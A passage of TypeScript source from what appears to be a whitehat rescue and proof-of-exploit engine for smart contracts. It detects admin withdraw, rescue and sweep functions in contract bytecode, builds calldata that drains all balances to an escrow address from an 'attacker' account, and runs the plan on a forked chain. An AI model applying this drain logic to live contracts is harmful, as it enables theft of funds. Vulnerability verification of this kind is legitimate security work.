  { selector: "0xf3fef3a3", signature: "withdraw(address,uint256)",           recipientPos: 0,  amountPos: 1, scope: "token" }, // (recipient, amount)
  { selector: "0x69328dec", signature: "withdraw(address,uint256,address)",   recipientPos: 2,  amountPos: 1, tokenPos: 0, scope: "token" }, // (token, amount, to)
  { selector: "0xf340fa01", signature: "deposit(address)",                    recipientPos: 0,  scope: "either" },
  { selector: "0x47e7ef24", signature: "deposit(address,uint256)",            recipientPos: 0,  amountPos: 1, scope: "token" },
  { selector: "0x9aea1481", signature: "rescueERC20(address,address,uint256)", recipientPos: 1, amountPos: 2, tokenPos: 0, scope: "token" },
  { selector: "0x8d1fdf2f", signature: "rescueERC20(address,uint256)",        recipientPos: 0,  amountPos: 1, scope: "token" }, // some variants
  { selector: "0xc5b95584", signature: "sweepToken(address)",                 recipientPos: -1, tokenPos: 0, scope: "token" },
  { selector: "0x9d76ea58", signature: "sweepTokens(address[],address)",      recipientPos: 1, tokenPos: 0, scope: "token" },
  { selector: "0x5312ea8e", signature: "emergencyWithdraw(uint256)",          recipientPos: -1, amountPos: 0, scope: "either" }, // sends to msg.sender
  { selector: "0xbc31c1c1", signature: "claim(address)",                      recipientPos: 0,  scope: "either" },
];

async function buildAdminHeuristicDrain(
  input: RescueProveInput,
  exposure: Exposure,
  url: string,
  notes: string[],
): Promise<DrainStep[]> {
  // Fetch the runtime bytecode and look for any of our admin selector
  // PUSH4s. Only emit drain steps for selectors that are actually present
  // in the bytecode — keeps the plan size bounded.
  const code = await rpcRequest<string>(url, "eth_getCode", [input.contractAddress, "latest"]).catch(
    () => "0x",
  );
  if (!code || code === "0x" || code.length < 10) return [];
  const lower = code.toLowerCase();
  const present = ADMIN_DRAIN_SIGS.filter((s) => lower.includes(s.selector.slice(2)));
  if (present.length === 0) {
    notes.push("admin-name heuristic: no withdraw*/rescue*/sweep* selectors PUSHed in bytecode");
    return [];
  }
  notes.push(
    `admin-name heuristic: ${present.length} candidate admin selector(s) PUSHed in bytecode ` +
      `(${present.map((p) => p.signature).slice(0, 6).join(", ")}${present.length > 6 ? ", …" : ""}). ` +
      `Each is tried from the attacker EOA; owner-gated ones simply revert and are filtered out.`,
  );

  // v5: all admin-name heuristic steps sent from attacker EOA. If the
  // function is owner-gated the on-fork call simply reverts and we move on.
  // For init-takeover phase-2 (after the attacker has assumed ownership),
  // these calls succeed because the attacker IS the owner. No
  // impersonation, no third-party key required.
  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  const push = (data: string, asset: string, strategy: string) => {
    const key = `${input.contractAddress}|${data}`;
    if (seen.has(key)) return;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data,
      value: "0",
      asset,
      strategy,
    });
  };

  for (const sig of present) {
    const argTypes = parseArgTypes(sig.signature);
    if (sig.scope === "native" || sig.scope === "either") {
      if (exposure.nativeWei && exposure.nativeWei !== "0") {
        const cd = buildAdminCalldata(sig, argTypes, {
          recipient: DEFAULT_ESCROW,
          amount: BigInt(exposure.nativeWei),
          token: null,
        });
        if (cd) push(cd, `native ${exposure.nativeSymbol} via ${sig.signature}`, `admin-heuristic:${sig.signature}`);
      }
    }
    if (sig.scope === "token" || sig.scope === "either") {
      for (const t of exposure.tokens) {
        if (!t.balance || t.balance === "0") continue;
        const cd = buildAdminCalldata(sig, argTypes, {
          recipient: DEFAULT_ESCROW,
          amount: BigInt(t.balance),
          token: t.address,
        });
        if (cd) push(cd, `${t.symbol || "?"} (${t.address}) via ${sig.signature}`, `admin-heuristic:${sig.signature}`);
      }
    }
    if (steps.length >= MAX_DRAIN_STEPS) break;
  }
  return steps;
}

function parseArgTypes(signature: string): string[] {
  const m = /\(([^)]*)\)/.exec(signature);
  if (!m) return [];
  const body = m[1].trim();
  if (!body) return [];
  return body.split(",").map((s) => s.trim());
}

/** Build calldata for one of the curated admin-named signatures by walking
 *  argTypes and filling each slot:
 *    - if pos == recipientPos -> escrow address
 *    - if pos == amountPos    -> amount (asset balance)
 *    - if pos == tokenPos     -> token address
 *    - otherwise              -> zero-padded default (0 / 0x00..00 / [])
 *  Returns null if any arg has an unsupported type. */
function buildAdminCalldata(
  sig: AdminSig,
  argTypes: string[],
  fill: { recipient: string; amount: bigint; token: string | null },
): string | null {
  const args: ArgValue[] = [];
  for (let i = 0; i < argTypes.length; i++) {
    const t = argTypes[i];
    if (i === sig.recipientPos) {
      if (t === "address") {
        args.push({ kind: "address", value: fill.recipient });
        continue;
      }
      if (t === "address[]") {
        args.push({ kind: "address[]", value: [fill.recipient] });
        continue;
      }
    }
    if (sig.amountPos != null && i === sig.amountPos && /^uint/.test(t)) {
      args.push({ kind: "uint", value: fill.amount });
      continue;
    }
    if (sig.tokenPos != null && i === sig.tokenPos && fill.token) {
      if (t === "address") {
        args.push({ kind: "address", value: fill.token });
        continue;
      }
      if (t === "address[]") {
        args.push({ kind: "address[]", value: [fill.token] });
        continue;
      }
    }
    // default fillers for unmapped slots
    if (t === "address") args.push({ kind: "address", value: "0x0000000000000000000000000000000000000000" });
    else if (/^uint/.test(t)) args.push({ kind: "uint", value: 0n });
    else if (t === "bool") args.push({ kind: "bool", value: false });
    else if (t === "bytes") args.push({ kind: "bytes", value: "0x" });
    else if (t === "string") args.push({ kind: "string", value: "" });
    else if (t === "address[]") args.push({ kind: "address[]", value: [] });
    else if (t === "uint[]") args.push({ kind: "uint[]", value: [] });
    else return null; // unsupported type — skip this signature
  }
  try {
    return buildAbiCalldata(sig.selector, args);
  } catch {
    return null;
  }
}

// ---- low-level calldata helpers --------------------------------------------

/**
 * Build a drain calldata using the same machinery the primary verifier
 * uses, but with the probe substituted by `addrOverride` and the bytes
 * payload by `inner`. Returns null when neither builder is applicable.
 */
function buildDrainCalldata(
  selector: string,
  argTypes: string[],
  addrPos: number | "all",
  addrOverride: string,
  inner: string,
  uintFillerDecimal: string,
): string | null {
  const filler = decimalToBigIntSafe(uintFillerDecimal);
  // Prefer the resolved-signature builder when we have argTypes.
  if (argTypes.length > 0) {
    try {
      return buildCalldataFromSignature(selector, argTypes, addrPos, addrOverride, {
        dataBytes: inner,
        uintFiller: filler,
      });
    } catch {
      // fall through
    }
  }
  // Fallback: only-selector path. We need *some* argCount estimate.
  try {
    const guessedArgCount = Math.max(typeof addrPos === "number" ? addrPos + 2 : 4, 4);
    return buildCalldataAddressAt(
      selector,
      argTypes,
      guessedArgCount,
      typeof addrPos === "number" ? addrPos : 0,
      addrOverride,
      { dataBytes: inner },
    );
  } catch {
    return null;
  }
}

function decimalToBigIntSafe(d: string): bigint {
  if (!d || d === "0") return 0n;
  try {
    return BigInt(d);
  } catch {
    return 0n;
  }
}

function encodeErc20Transfer(to: string, amount: bigint): string {
  const addr = to.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  let amt = amount.toString(16);
  if (amt.length > 64) amt = amt.slice(-64);
  amt = amt.padStart(64, "0");
  return ERC20_TRANSFER_SELECTOR + addr + amt;
}

function encodeErc20TransferFrom(from: string, to: string, amount: bigint): string {
  const f = from.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  const t = to.replace(/^0x/, "").toLowerCase().padStart(64, "0");
  let amt = amount.toString(16);
  if (amt.length > 64) amt = amt.slice(-64);
  amt = amt.padStart(64, "0");
  return ERC20_TRANSFER_FROM_SELECTOR + f + t + amt;
}

// ---- execution + state-diff -----------------------------------------------

async function executePlan(url: string, steps: DrainStep[]): Promise<PoeDrainStep[]> {
  const out: PoeDrainStep[] = [];
  for (let i = 0; i < steps.length; i++) {
    const s = steps[i];
    const valueHex = s.value === "0" ? "0x0" : "0x" + BigInt(s.value).toString(16);
    try {
      const sendResult = await sendFromAddress(url, RESCUER_ADDRESS, s.to, s.data, { value: valueHex });
      const success = sendResult.receipt?.status === "0x1";
      out.push({
        index: i,
        to: s.to,
        data: s.data,
        value: s.value,
        asset: s.asset,
        gasUsed: sendResult.receipt?.gasUsed ?? null,
        success: !!success,
        revertReason: success
          ? null
          : `tx ${sendResult.txHash ?? "?"} status=${sendResult.receipt?.status ?? "none"}`,
        from: RESCUER_ADDRESS,
        strategy: s.strategy,
      });
    } catch (err: any) {
      out.push({
        index: i,
        to: s.to,
        data: s.data,
        value: s.value,
        asset: s.asset,
        gasUsed: null,
        success: false,
        revertReason: String(err?.message ?? err).slice(0, 240),
        from: RESCUER_ADDRESS,
        strategy: s.strategy,
      });
    }
  }
  return out;
}

interface LiveBalances {
  nativeWei: string;
  nativeUsdPerToken: number | null;
  nativeSymbol: string;
  nativeDecimals: number;
  tokens: Array<{
    address: string;
    symbol: string;
    decimals: number;
    balance: string;
    usdPerToken: number | null;
  }>;
}

async function readBalances(
  url: string,
  chainId: number,
  address: string,
  exposure: Exposure,
): Promise<LiveBalances> {
  // For tokens we already know about, read fresh balances from the fork.
  const tokens: LiveBalances["tokens"] = [];
  for (const t of exposure.tokens) {
    let bal = "0";
    try {
      const raw = await rpcRequest<string>(url, "eth_call", [
        { to: t.address, data: "0x70a08231" + address.replace(/^0x/, "").toLowerCase().padStart(64, "0") },
        "latest",
      ]);
      bal = raw && raw !== "0x" ? BigInt(raw).toString() : "0";
    } catch {
      bal = t.balance;
    }
    tokens.push({
      address: t.address,
      symbol: t.symbol,
      decimals: t.decimals,
      balance: bal,
      usdPerToken: t.usdPerToken ?? null,
    });
  }
  let nativeWei = "0";
  try {
    const hex = await rpcRequest<string>(url, "eth_getBalance", [address, "latest"]);
    nativeWei = BigInt(hex).toString();
  } catch {
    nativeWei = exposure.nativeWei;
  }
  return {
    nativeWei,
    nativeUsdPerToken: exposure.nativeUsdPerToken ?? null,
    nativeSymbol: exposure.nativeSymbol,
    nativeDecimals: exposure.nativeDecimals,
    tokens,
  };
}

function diffRescued(
  contractPre: LiveBalances,
  contractPost: LiveBalances,
  escrowPre: LiveBalances,
  escrowPost: LiveBalances,
  force?: boolean,
): PoeAssetRescued[] {
  const out: PoeAssetRescued[] = [];

  const contractNativeDelta = BigInt(contractPre.nativeWei) - BigInt(contractPost.nativeWei);
  const escrowNativeDelta = BigInt(escrowPost.nativeWei) - BigInt(escrowPre.nativeWei);
  // Use escrow's gain as the source of truth (gas costs distort the contract
  // side when the attacker EOA pays gas from its funded balance).
  if (escrowNativeDelta > 0n && contractNativeDelta > 0n) {
    const amt = escrowNativeDelta < contractNativeDelta ? escrowNativeDelta : contractNativeDelta;
    const human = Number(amt) / Math.pow(10, contractPre.nativeDecimals);
    const usd =
      contractPre.nativeUsdPerToken != null && Number.isFinite(human)
        ? human * contractPre.nativeUsdPerToken
        : null;
    if (force || usd == null || usd >= MIN_DRAIN_USD) {
      out.push({
        token: null,
        amountBase: amt.toString(),
        symbol: contractPre.nativeSymbol,
        decimals: contractPre.nativeDecimals,
        usdValue: usd,
      });
    }
  }

  const preTokens = new Map(contractPre.tokens.map((t) => [t.address.toLowerCase(), t]));
  const postTokens = new Map(contractPost.tokens.map((t) => [t.address.toLowerCase(), t]));
  const escrowPostTokens = new Map(escrowPost.tokens.map((t) => [t.address.toLowerCase(), t]));
  const escrowPreTokens = new Map(escrowPre.tokens.map((t) => [t.address.toLowerCase(), t]));

  for (const [addr, pre] of preTokens) {
    const post = postTokens.get(addr);
    const escPre = escrowPreTokens.get(addr);
    const escPost = escrowPostTokens.get(addr);
    const contractDelta = BigInt(pre.balance) - BigInt(post?.balance ?? "0");
    const escrowDelta = BigInt(escPost?.balance ?? "0") - BigInt(escPre?.balance ?? "0");
    if (contractDelta > 0n && escrowDelta > 0n) {
      const amt = escrowDelta < contractDelta ? escrowDelta : contractDelta;
      const human = Number(amt) / Math.pow(10, pre.decimals);
      const usd =
        pre.usdPerToken != null && Number.isFinite(human) ? human * pre.usdPerToken : null;
      if (!force && usd != null && usd < MIN_DRAIN_USD) continue;
      out.push({
        token: addr,
        amountBase: amt.toString(),
        symbol: pre.symbol,
        decimals: pre.decimals,
        usdValue: usd,
      });
    }
  }
  return out;
}

function drainedEverything(pre: LiveBalances, post: LiveBalances): boolean {
  if (BigInt(post.nativeWei) > 0n) return false;
  for (const p of post.tokens) {
    if (BigInt(p.balance) > 0n) return false;
  }
  // also requires that pre had something
  if (BigInt(pre.nativeWei) === 0n && pre.tokens.every((t) => t.balance === "0")) return false;
  return true;
}

function snapStateFromLive(s: LiveBalances): PoeArtifact["preState"] {
  const nativeHuman = Number(s.nativeWei) / Math.pow(10, s.nativeDecimals);
  const nativeUsd =
    s.nativeUsdPerToken != null && Number.isFinite(nativeHuman)
      ? nativeHuman * s.nativeUsdPerToken
      : null;
  return {
    nativeWei: s.nativeWei,
    nativeUsd,
    tokens: s.tokens.map((t) => {
      const human = Number(t.balance) / Math.pow(10, t.decimals);
      const usdValue =
        t.usdPerToken != null && Number.isFinite(human) ? human * t.usdPerToken : null;
      return {
        address: t.address,
        symbol: t.symbol,
        decimals: t.decimals,
        balance: t.balance,
        usdValue,
      };
    }),
  };
}

function snapState(exp: Exposure): PoeArtifact["preState"] {
  const nativeHuman = Number(exp.nativeWei) / Math.pow(10, exp.nativeDecimals);
  const nativeUsd =
    exp.nativeUsdPerToken != null && Number.isFinite(nativeHuman)
      ? nativeHuman * exp.nativeUsdPerToken
      : null;
  return {
    nativeWei: exp.nativeWei,
    nativeUsd,
    tokens: exp.tokens.map((t) => ({
      address: t.address,
      symbol: t.symbol,
      decimals: t.decimals,
      balance: t.balance,
      usdValue: t.usdValue ?? null,
    })),
  };
}

function emptyState(): PoeArtifact["preState"] {
  return { nativeWei: "0", nativeUsd: null, tokens: [] };
}

// ---- finalise + persist + notify ------------------------------------------

interface FinaliseArgs {
  attemptId: string;
  input: RescueProveInput;
  verdict: PoeVerdict;
  assets: PoeAssetRescued[];
  plan: PoeDrainStep[];
  pre: PoeArtifact["preState"];
  post: PoeArtifact["postState"];
  notes: string[];
  blockNumber: number | null;
  error: string | null;
  startedAt: number;
  /** v3 fields */
  approvalVictims?: PoeApprovalVictim[];
  trappedAssets?: PoeTrappedAsset[];
  flashloanRequirement?: PoeArtifact["flashloanRequirement"];
}

function finalise(args: FinaliseArgs): PoeArtifact {
  const ev = (args.input.evidence ?? {}) as any;
  const attackerKindRaw = ev.attackerKind ?? "unknown";
  const attackerKind: PoeArtifact["attackerKind"] =
    attackerKindRaw === "any" || attackerKindRaw === "owner" ? attackerKindRaw : "unknown";

  const totalUsd =
    args.assets.length === 0
      ? null
      : args.assets.reduce((acc, a) => (a.usdValue != null ? acc + a.usdValue : acc), 0) || null;

  const poe: PoeArtifact = {
    attemptId: args.attemptId,
    findingId: args.input.findingId,
    chainId: args.input.chainId,
    contractAddress: args.input.contractAddress.toLowerCase(),
    attackerKind,
    approvalVictims: args.approvalVictims ?? [],
    trappedAssets: args.trappedAssets ?? [],
    flashloanRequirement: args.flashloanRequirement ?? null,
    escrowAddress: DEFAULT_ESCROW.toLowerCase(),
    attackerEoa: RESCUER_ADDRESS.toLowerCase(),
    verdict: args.verdict,
    blockNumber: args.blockNumber,
    rescuedAssets: args.assets,
    drainPlan: args.plan,
    totalRescuedUsd: totalUsd,
    preState: args.pre,
    postState: args.post,
    notes: args.notes,
    engine: ENGINE_ID,
    engineVersion: ENGINE_VERSION,
    createdAt: Date.now(),
    durationMs: Date.now() - args.startedAt,
    error: args.error,
  };
  try {
    persistPoe(poe);
    logRescueAction({
      findingId: poe.findingId,
      attemptId: poe.attemptId,
      kind: "poe-generated",
      detail: {
        verdict: poe.verdict,
        rescuedAssets: poe.rescuedAssets.length,
        totalRescuedUsd: poe.totalRescuedUsd,
      },
    });
  } catch (e) {
    console.warn("[rescue-prove] failed to persist PoE", e);
  }
  if (
    poe.verdict === "true_positive_drained" ||
    poe.verdict === "true_positive_partial" ||
    poe.verdict === "victim_approval_rescue" ||
    poe.verdict === "requires_flashloan_helper"
  ) {
    // Notify asynchronously — never block the prover on a slow webhook.
    void notifyRescueWebhook(poe).catch(() => null);
  }
  return poe;
}

// ---- TG/webhook notify -----------------------------------------------------

async function notifyRescueWebhook(poe: PoeArtifact): Promise<void> {
  const summary = {
    type: "rescue.poe",
    findingId: poe.findingId,
    chainId: poe.chainId,
    contractAddress: poe.contractAddress,
    verdict: poe.verdict,
    totalRescuedUsd: poe.totalRescuedUsd,
    rescuedCount: poe.rescuedAssets.length,
    escrow: poe.escrowAddress,
    blockNumber: poe.blockNumber,
    poeUrl: `/api/proofs/${poe.findingId}/poe.json`,
    createdAt: poe.createdAt,
  };

  // 1. In-process TG bot (skipped silently when TG_BOT_TOKEN unset).
  try {
    const { notifyPoe } = await import("../rescue/tg-bot");
    await notifyPoe({
      findingId: poe.findingId,
      chainId: poe.chainId,
      contractAddress: poe.contractAddress,
      verdict: poe.verdict,
      totalRescuedUsd: poe.totalRescuedUsd,
      rescuedCount: poe.rescuedAssets.length,
      escrow: poe.escrowAddress,
      blockNumber: poe.blockNumber,
    });
  } catch (err) {
    console.warn("[rescue-prove] tg notify failed", err);
  }

  // 2. Generic outbound webhook (for users who want to plug another bot,
  //    Slack/Discord/whatever — they hit /api/proofs/[id]/poe.json themselves).
  if (NOTIFY_URL) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), NOTIFY_TIMEOUT_MS);
    try {
      await fetch(NOTIFY_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(summary),
        signal: ac.signal,
      });
      logRescueAction({
        findingId: poe.findingId,
        attemptId: poe.attemptId,
        kind: "tg-notified",
        detail: { url: NOTIFY_URL, ok: true },
      });
    } catch (err) {
      logRescueAction({
        findingId: poe.findingId,
        attemptId: poe.attemptId,
        kind: "tg-notified",
        detail: { url: NOTIFY_URL, ok: false, error: String((err as any)?.message ?? err) },
      });
    } finally {
      clearTimeout(t);
    }
  }
}
